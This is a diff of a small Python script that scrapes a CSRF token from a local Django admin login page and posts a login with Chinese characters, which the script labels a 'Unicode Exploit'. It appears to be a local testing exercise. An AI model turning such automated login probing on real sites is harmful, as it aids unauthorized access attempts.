@@ -16,25 +16,26 @@ def ui():
     pass
 
 
-def requestPage(url = 0):#url):
+def requestPage(url = "http://localhost:8000/admin/login/?next=/admin/"):
+    assert type(url) == str
+    
+    # Start Session
+    client = requests.session() 
 
-    client = requests.session() #Set Session for requests
-
-    # first get csrf token by stealing csrf from body of return html
-    r = client.get('http://localhost:8000/admin/login/?next=/admin/', auth=('user', 'pass'))
-    r = r.text
-    r = r[r.find('value'):] # search html for csrf value
-    token = str(r[7:r.find('"', 7)]) # get csrf token
+    # Gets CSRF token from returned HTML
+    page = client.get(url, auth=('user', 'pass'))
+    page = page.text
+    page = page[page.find('value'):] # Search for CSRF
+    token = str(page[7:page.find('"', 7)]) # Get CSRF
 
 
-    # Payload with unicode vonerability
+    # Payload with Unicode Exploit
     payload = {'username': '漢', 'password': '漢' , "csrfmiddlewaretoken":token}
-    r = client.post('http://localhost:8000/admin/login/?next=/admin/', data = payload)
-    #r = r.json()
-    print(r.text)
+    page = client.post(url, data = payload)
+    print(page.text) # Another option is r = r.json()
     file = open("outputer.html", "w")
-    file.write(str(r.text))
-    return r.text
+    file.write(str(page.text))
+    return page.text
 
 def parseHTML(html_doc, file = False):
     """
@@ -42,11 +43,12 @@ def parseHTML(html_doc, file = False):
 
     Returns: str, all text inside of html document
     """
+    # Ensures that URL is String
     assert type(html_doc) == str
 
-    if(file == True): #is a file name
+    if(file == True): # Does the file exist?
         contents = open(html_doc, 'r')
-        html_doc = contents1.read()
+        html_doc = contents.read()
         contents.close()
     return BeautifulSoup(html_doc, 'html.parser')
     #fileContents = BeautifulSoup(html_doc, 'html.parser')
